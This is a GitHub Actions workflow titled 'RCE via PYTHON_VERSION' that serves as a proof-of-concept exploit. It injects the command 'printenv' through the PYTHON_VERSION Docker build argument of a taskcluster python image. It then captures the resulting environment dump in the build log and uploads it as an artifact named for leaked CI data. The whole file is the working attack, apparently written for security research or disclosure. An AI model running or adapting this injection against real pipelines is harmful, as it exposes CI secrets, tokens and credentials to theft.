name: RCE via PYTHON_VERSION

on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Inject and Capture Build Output
        run: |
          mkdir -p artifacts # Ensure the directory exists

          # 1. Build the Docker image with the injection
          #    The PYTHON_VERSION payload now simply prints environment variables to stdout.
          #    We capture ALL output from the 'docker build' command and save it to a file
          #    on the GitHub Actions runner's filesystem using 'tee'.
          docker build \
            --build-arg PYTHON_VERSION="printenv" \
            -t leak-image \
            ./taskcluster/docker/python \
            2>&1 | tee artifacts/leaked_build_output.txt
          
          # The 'tee' command above has already saved the build log (which includes the RCE output).
          # You can also run other commands here and tee their output as well.
          
          # You can optionally print the captured output to the workflow logs for quick viewing
          echo "--- Contents of leaked_build_output.txt ---"
          cat artifacts/leaked_build_output.txt || echo "No build output captured."

      - name: Upload Leaked Data as Artifact
        uses: actions/upload-artifact@v3
        with:
          name: leaked-ci-data-from-buildlog
          path: artifacts/leaked_build_output.txt
          # retention-days: 5 # Optional: specify how long to keep the artifact
